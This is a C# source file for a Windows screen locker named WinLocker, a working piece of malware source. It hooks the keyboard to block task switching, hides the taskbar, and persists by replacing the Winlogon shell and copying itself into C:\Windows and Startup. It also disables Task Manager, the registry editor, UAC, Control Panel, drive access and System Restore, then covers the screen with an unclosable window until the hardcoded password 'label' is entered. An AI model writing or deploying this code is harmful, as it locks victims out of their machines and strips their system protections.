using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace WinLocker
{
    public partial class winlocker : Form

    {
        public winlocker()
        {
            InitializeComponent();
        }
        private static class TaskBar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            private static int Handle => FindWindow("Shell_TrayWnd", "");
            private static int StartHandle => FindWindow("Button", "Пуск");
            private static void HideTaskBar() => ShowWindow(Handle, SW_HIDE);
            private static void HideStartButton() => ShowWindow(StartHandle, SW_HIDE);
            private static void ShowTaskBar() => ShowWindow(Handle, SW_SHOW);
            private static void ShowStartButton() => ShowWindow(StartHandle, SW_SHOW);

            #region Control
            public static void Lock()
            {
                HideTaskBar();
                HideStartButton();
            }
            public static void Unlock()
            {
                ShowTaskBar();
                ShowStartButton();
            }
            #endregion
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            base.OnClosing(e);
        }
        [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, int hMod, int dwThreadId);
        [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int UnhookWindowsHookEx(int hHook);
        public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern int CallNextHookEx(int hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
        public const int WH_KEYBOARD_LL = 13;

        /*code needed to disable start menu*/
        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }
        public static int intLLKey;

        public int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;

            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key,
                    blnEat = ((lParam.vkCode == 9) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 32)) | ((lParam.vkCode == 27) && (lParam.flags == 0)) | ((lParam.vkCode == 91) && (lParam.flags == 1)) | ((lParam.vkCode == 92) && (lParam.flags == 1)) | ((lParam.vkCode == 73) && (lParam.flags == 0));
                    break;
            }

            if (blnEat == true)
            {
                return 1;
            }
            else
            {
                return CallNextHookEx(0, nCode, wParam, ref lParam);
            }
        }
        public void KillStartMenu()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }
        private static class Rebooting
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.SetValue("NoClose", key, RegistryValueKind.DWord);
                reg.Close();
            }

            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.SetValue("NoClose", "0", RegistryValueKind.DWord);
                reg.Close();
            }
        }

        private static class Right_click
        {
            #region Control
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.CreateSubKey(sub);
                reg.SetValue("NoViewContextMenu", key);
                reg.Close();

            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";

                reg = Registry.LocalMachine.OpenSubKey(sub, true);
                reg.SetValue("NoViewContextMenu", "0");
                reg.Close();
            }
            #endregion
        }
        private static class uac
        {
            public static void Lock()
            {
                string UAC_key = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                Registry.SetValue(UAC_key, "EnableLUA", 0);
                string dildo = @"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\MMC";
                Registry.SetValue(dildo, "RestrictToPermittedSnapins", 1);
                string xer = @"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
                Registry.SetValue(xer, "NoControlPanel", 1);
                Registry.SetValue(xer, "NoRun", 1);
                Registry.SetValue(xer, "NoViewOnDrive", "0x03FFFFFFFF");
                Registry.SetValue(xer, "NoDrives", 67108863);
                Registry.SetValue(xer, "NoFileMenu", 1);
                Registry.SetValue(xer, "NoClose", 1);
                Registry.SetValue(xer, "StartMenuLogOff", 1);
                Registry.SetValue(xer, "NoWinKeys", 1);
                Registry.SetValue(xer, "HidePowerOptions", 1);
                string uebok = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore";
                Registry.SetValue(uebok, "DisableSR", 1);
            }
            public static void Unlock()
            {
                string UAC_key = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                Registry.SetValue(UAC_key, "EnableLUA", 0);
            }
        }

        private class Registry_editor
        {
            public static void Lock()
            {
                RegistryKey reg;
                string key = "1";
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.CreateSubKey(sub);
                reg.SetValue("DisableRegistryTools", key, RegistryValueKind.DWord);
                reg.Close();
            }
            public static void Unlock()
            {
                RegistryKey reg;
                string sub = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

                reg = Registry.CurrentUser.OpenSubKey(sub, true);
                reg.SetValue("DisableRegistryTools", "0", RegistryValueKind.DWord);

                reg.Close();
            }
        }
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SwapMouseButton([param: MarshalAs(UnmanagedType.Bool)] bool fSwap);
        public Screen GetSecondaryScreen()
        {
            if (Screen.AllScreens.Length == 1)
            {
                return null;
            }
            foreach (Screen screen in Screen.AllScreens)
            {
                if (screen.Primary == false)
                {
                    return screen;
                }
            }
            return null;
        }

 
        

        
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == (Keys.Alt | Keys.F4))
            {
                // Игнорируем Alt+F4
                return true;
            }
            if (keyData == (Keys.Alt | Keys.Control | Keys.Delete))
            {
                // Игнорируем CTRL+ALT+DEL
                return true;
            }


            return base.ProcessCmdKey(ref msg, keyData);
        }
      
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "label")
            {
                TaskBar.Unlock();
                Registry_editor.Unlock();
                Right_click.Unlock();
                Rebooting.Unlock();
                uac.Unlock();
                try
                {
                    // Путь до ключа реестра для DisableTaskMgr
                    string systemPoliciesPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";

                    // Путь до ключа реестра для Userinit
                    //string winLogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                    // Значение для Userinit
                    //string newUserinitValue = @"C:\Windows\system32\userinit.exe, D:\WinLocker\WinLocker\bin\Debug\WinLocker.exe"; // Пример значения

                    // Открытие или создание ключа реестра для DisableTaskMgr
                    using (RegistryKey systemPoliciesKey = Registry.CurrentUser.OpenSubKey(systemPoliciesPath, true) ?? Registry.CurrentUser.CreateSubKey(systemPoliciesPath))
                    {
                        if (systemPoliciesKey != null)
                        {
                            // Установка значения DisableTaskMgr в 0 (включение Диспетчера задач)
                            systemPoliciesKey.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                            //MessageBox.Show("DisableTaskMgr set to 0 successfully.");
                        }
                        else
                        {
                            MessageBox.Show("Failed to access or create the registry key for DisableTaskMgr.");
                        }
                    }

                    try
                    {
                        string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
                        {
                            if (key != null)
                            {
                                // Set the Shell value to explorer1.exe
                                key.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
                                //MessageBox.Show("Shell has been changed to explorer1.exe.");
                            }
                            else
                            {
                                MessageBox.Show("Could not open the registry key.");
                            }
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        MessageBox.Show("You need to run this application as an administrator.");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"An error occurred: {ex.Message}");
                    }
                    // Открытие ключа реестра для Userinit в разделе HKEY_LOCAL_MACHINE

                }
                catch (UnauthorizedAccessException)
                {
                    MessageBox.Show("Error: Administrator privileges are required to modify the registry.");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"An error occurred: {ex.Message}");
                }
                SwapMouseButton(false);
                string dest = "C:\\windows\\winlocker.exe";
                string dest1 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\winlocker.exe";
                System.IO.File.Delete(dest);
                System.IO.File.Delete(dest1);
                this.Close();
            }
            else
            {
                MessageBox.Show("Пароль неверный");
            }
            
        }
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern IntPtr LoadLibrary(string lpFileName);

        private void winlocker_Load(object sender, EventArgs e)
        {
            var inst = LoadLibrary("user32.dll").ToInt32();
            intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, inst, 0);

            //Process process = new Process();

            try
            {
                // Путь до ключа реестра для DisableTaskMgr
                string systemPoliciesPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";

                // Путь до ключа реестра для Userinit
                //string winLogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                // Значение для Userinit
                //string newUserinitValue = @"C:\Windows\system32\userinit.exe,"; // Пример значения

                // Открытие или создание ключа реестра для DisableTaskMgr
                using (RegistryKey systemPoliciesKey = Registry.CurrentUser.OpenSubKey(systemPoliciesPath, true) ?? Registry.CurrentUser.CreateSubKey(systemPoliciesPath))
                {
                    if (systemPoliciesKey != null)
                    {
                        // Установка значения DisableTaskMgr в 0 (включение Диспетчера задач)
                        systemPoliciesKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        //MessageBox.Show("DisableTaskMgr set to 0 successfully.");
                    }
                    else
                    {
                        MessageBox.Show("Failed to access or create the registry key for DisableTaskMgr.");
                    }
                    try
                    {
                        string registryPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath, true))
                        {
                            if (key != null)
                            {
                                // Set the Shell value to explorer1.exe
                                key.SetValue("Shell", "winlocker.exe", RegistryValueKind.String);
                                //MessageBox.Show("Shell has been changed to explorer1.exe.");
                            }
                            else
                            {
                                MessageBox.Show("Could not open the registry key.");
                            }
                        }
                    }
                    catch (UnauthorizedAccessException)
                    {
                        MessageBox.Show("You need to run this application as an administrator.");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"An error occurred: {ex.Message}");
                    }
                }

                // Открытие ключа реестра для Userinit в разделе HKEY_LOCAL_MACHINE

            }
            catch (UnauthorizedAccessException)
            {
                MessageBox.Show("Error: Administrator privileges are required to modify the registry.");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}");
            }
            string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string dest = "C:\\windows\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
            try
            {
                string dest1 = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
                System.IO.File.Copy(src, dest1);
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
            System.IO.File.Copy(src, dest);
            //SwapMouseButton(true);
            //process.StartInfo.FileName = "explorer.exe";
            //System.Threading.Thread.Sleep(2000);
            //process.Kill();
            TaskBar.Lock();
            Registry_editor.Lock();
            Right_click.Lock();
            Rebooting.Lock();
            uac.Lock();
            // Execute the shutdown command with the restart (/r) flag
            //Process.Start("shutdown", "/r /t 5");


            //Cursor.Hide(); // Скрываем курсор
            // Убираем границы формы
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            // Разворачиваем форму на весь экран
            this.WindowState = FormWindowState.Maximized;
            //Cursor.Hide(); // Скрываем курсор
            // Добавляем фон или другие элементы интерфейса
            //this.BackColor = System.Drawing.Color.CornflowerBlue; // Устанавливаем цвет фона для примера
            //DisableTaskManager();

            // Запуск основной формы приложения
            //Application.Run(new winlocker());
        }
    }
}